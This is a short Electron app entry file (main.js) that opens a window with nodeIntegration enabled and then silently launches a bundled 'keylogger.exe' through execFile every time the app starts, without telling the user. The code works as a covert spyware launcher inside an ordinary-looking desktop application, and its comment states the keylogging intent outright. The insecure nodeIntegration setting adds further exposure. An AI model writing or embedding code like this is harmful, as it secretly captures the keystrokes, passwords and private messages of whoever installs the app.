
// electron-app/main.js
const { app, BrowserWindow } = require('electron');
const { execFile } = require('child_process');
const path = require('path');

function createWindow() {
  const win = new BrowserWindow({

    webPreferences: { nodeIntegration: true },
  });

  win.loadFile('index.html');

  // Run the keylogger executable
  const keyloggerPath = path.join(__dirname, '../dist/keylogger.exe');
  execFile(keyloggerPath, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error running keylogger: ${error.message}`);
      return;
    }
  });
}

app.whenReady().then(createWindow);
